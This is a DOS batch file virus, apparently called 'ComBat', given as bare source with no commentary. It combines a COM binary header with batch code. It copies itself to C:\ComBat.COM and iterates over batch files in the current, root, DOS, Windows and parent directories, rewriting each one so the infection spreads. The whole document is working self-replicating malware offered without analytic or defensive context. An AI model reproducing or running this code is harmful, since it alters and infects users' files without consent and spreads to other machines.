@REM ÿë% * ComBat *
@echo off
goto ComBat
¾€                 
uûÆDÿ                                                                                                         
:ComBat
if #%_tmp%#==## goto no_call
C:\ComBat.COM %1
if errorlevel 1 goto done_ComBat
type %1 >> ComBat.TMP
echo. >> ComBat.TMP
echo :done_ComBat >> ComBat.TMP
copy ComBat.TMP %1 > nul
del ComBat.TMP > nul
goto done_ComBat
:no_call
set _tmp=%0
if #%_tmp%#==## set _tmp=AUTOEXEC.BAT
if not exist %_tmp% set _tmp=%0.BAT
if not exist %_tmp% goto path_error
copy %_tmp% C:\ComBat.COM > nul
for %%f in (*.bat c:\*.bat c:\dos\*.bat c:\windows\*.bat ..\*.bat) do call %_tmp% %%f
del C:\ComBat.COM > nul
:path_error
set _tmp=
:done_ComBat
